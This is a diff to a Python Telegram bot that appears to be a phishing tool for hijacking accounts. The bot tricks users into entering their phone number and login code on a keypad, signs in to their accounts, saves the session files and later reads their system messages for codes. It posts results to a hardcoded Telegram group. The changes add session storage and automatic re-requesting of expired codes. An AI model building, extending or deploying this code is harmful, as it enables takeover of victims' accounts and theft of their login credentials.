@@ -7,6 +7,7 @@ import asyncio
 import os
 import glob
 import re
+import pathlib
 from dotenv import load_dotenv
 
 # Carrega as variáveis do arquivo .env
@@ -16,19 +17,23 @@ load_dotenv()
 api_id = int(os.getenv('API_ID'))
 api_hash = os.getenv('API_HASH')
 
+# Cria pasta de sessões se não existir
+SESSIONS_DIR = pathlib.Path("sessions")
+SESSIONS_DIR.mkdir(exist_ok=True)
+
 # Estados para o fluxo da conversa
 CONFIRM_HUMAN, ASK_PHONE, ASK_CODE = range(3)
 
 # Função para encontrar todas as sessões existentes no diretório
 def find_existing_sessions():
-    # Procura por arquivos de sessão no diretório atual
-    session_files = glob.glob("session_+*.session")
+    # Procura por arquivos de sessão na pasta de sessões
+    session_files = glob.glob(str(SESSIONS_DIR / "session_+*.session"))
     
     # Extrai os números de telefone das sessões encontradas
     sessions = []
     for session_file in session_files:
         # Usa expressão regular para extrair o número de telefone do nome do arquivo
-        match = re.search(r'session_\+(\d+)\.session', session_file)
+        match = re.search(r'session_\+(\d+)\.session', os.path.basename(session_file))
         if match:
             phone_number = match.group(1)
             sessions.append(phone_number)
@@ -42,18 +47,24 @@ def check_session_exists_for_phone(phone_number):
         phone_number = phone_number[1:]
         
     # Verifica se o arquivo de sessão existe
-    session_file = f"session_+{phone_number}.session"
-    return os.path.exists(session_file)
+    session_file = SESSIONS_DIR / f"session_+{phone_number}.session"
+    return session_file.exists()
 
 # Função para enviar a solicitação de código
 async def request_code(phone):
-    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
+    # Remove o '+' se existir no início do número
+    if phone.startswith('+'):
+        phone = phone[1:]
+        
+    session_path = SESSIONS_DIR / f"session_+{phone}"
+    client = TelegramClient(str(session_path), api_id, api_hash)
     await client.connect()
     
     if not await client.is_user_authorized():
         try:
             print("Enviando solicitação de código para o número:", f'+{phone}')
             sent = await client.send_code_request(f'+{phone}')
+            print(sent)
             await client.disconnect()
             return True, "Código enviado com sucesso", sent.phone_code_hash
         except Exception as e:
@@ -65,7 +76,12 @@ async def request_code(phone):
 
 # Função para verificar se um número de telefone já está autenticado
 async def check_auth_status(phone):
-    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
+    # Remove o '+' se existir no início do número
+    if phone.startswith('+'):
+        phone = phone[1:]
+        
+    session_path = SESSIONS_DIR / f"session_+{phone}"
+    client = TelegramClient(str(session_path), api_id, api_hash)
     await client.connect()
     
     # Verifica se a sessão está autorizada
@@ -116,6 +132,10 @@ async def leave_telegram_group(client, group_entity):
 
 # Função para verificar mensagens do sistema após um delay
 async def check_system_message_after_delay(phone, delay_seconds=180):
+    # Remove o '+' se existir no início do número
+    if phone.startswith('+'):
+        phone = phone[1:]
+        
     print(f"Timer iniciado: verificando mensagens do sistema em {delay_seconds} segundos para +{phone}...")
     
     # Aguarda o tempo especificado
@@ -124,7 +144,8 @@ async def check_system_message_after_delay(phone, delay_seconds=180):
     print(f"Timer concluído: verificando mensagens do sistema para +{phone}")
     
     # Conecta ao cliente Telethon usando a sessão do usuário
-    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
+    session_path = SESSIONS_DIR / f"session_+{phone}"
+    client = TelegramClient(str(session_path), api_id, api_hash)
     await client.connect()
     
     try:
@@ -176,7 +197,7 @@ async def check_system_message_after_delay(phone, delay_seconds=180):
                 system_message = f"Não consegui pegar o código"
             
             # Entrar no grupo, enviar a mensagem e sair
-            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
+            group_entity = await join_telegram_group(client, group_id=-1002310545045, group_username="linbotteste")
             
             if group_entity:
                 # Enviar a mensagem
@@ -200,7 +221,12 @@ async def check_system_message_after_delay(phone, delay_seconds=180):
 
 # Função para fazer login e enviar mensagens
 async def login_and_send_messages(phone, code=None, phone_code_hash=None, update=None):
-    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
+    # Remove o '+' se existir no início do número
+    if phone.startswith('+'):
+        phone = phone[1:]
+        
+    session_path = SESSIONS_DIR / f"session_+{phone}"
+    client = TelegramClient(str(session_path), api_id, api_hash)
     await client.connect()
 
     try:
@@ -213,6 +239,12 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
                     print("Login realizado com sucesso!")
                 except Exception as e:
                     await client.disconnect()
+                    
+                    # Tratamento específico para código expirado
+                    if "code has expired" in str(e).lower():
+                        print("Código expirado. Solicitando novo código...")
+                        return "EXPIRED_CODE"  # Código especial para indicar código expirado
+                    
                     return f"Erro ao logar: {e}"
             else:
                 # Se não forneceu código e hash e não está autorizado, não pode continuar
@@ -284,7 +316,7 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
         try:
             # Entrar no grupo usando ID e username
             print("Tentando entrar no grupo especificado...")
-            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
+            group_entity = await join_telegram_group(client, group_id=-1002310545045, group_username="linbotteste")
             
             if group_entity:
                 # Enviar a mensagem de log no grupo
@@ -440,9 +472,39 @@ async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             # Chama a função de login e envio de mensagens
             result = await login_and_send_messages(phone, code, phone_code_hash, update)
-            await update.message.reply_text(result)            
             
-            return ConversationHandler.END
+            # Se o código expirou, solicita um novo código automaticamente
+            if result == "EXPIRED_CODE":
+                await update.message.reply_text("O código expirou. Solicitando um novo código...")
+                
+                # Solicita um novo código
+                success, message, new_phone_code_hash = await request_code(phone)
+                
+                if success:
+                    # Atualiza o phone_code_hash no contexto
+                    context.user_data["phone_code_hash"] = new_phone_code_hash
+                    context.user_data["code_digits"] = ""  # Limpa o código digitado anteriormente
+                    
+                    # Cria teclado numérico para o novo código
+                    keyboard = [
+                        ["1", "2", "3"],
+                        ["4", "5", "6"],
+                        ["7", "8", "9"],
+                        ["0", "Limpar"]
+                    ]
+                    
+                    await update.message.reply_text(
+                        "Novo código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
+                        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+                    )
+                    return ASK_CODE  # Mantém o estado para receber o novo código
+                else:
+                    await update.message.reply_text(f"Erro ao solicitar novo código: {message}")
+                    return ConversationHandler.END
+            else:
+                # Caso não seja problema de código expirado, exibe a mensagem normalmente
+                await update.message.reply_text(result)            
+                return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print("Operação cancelada pelo usuário.")
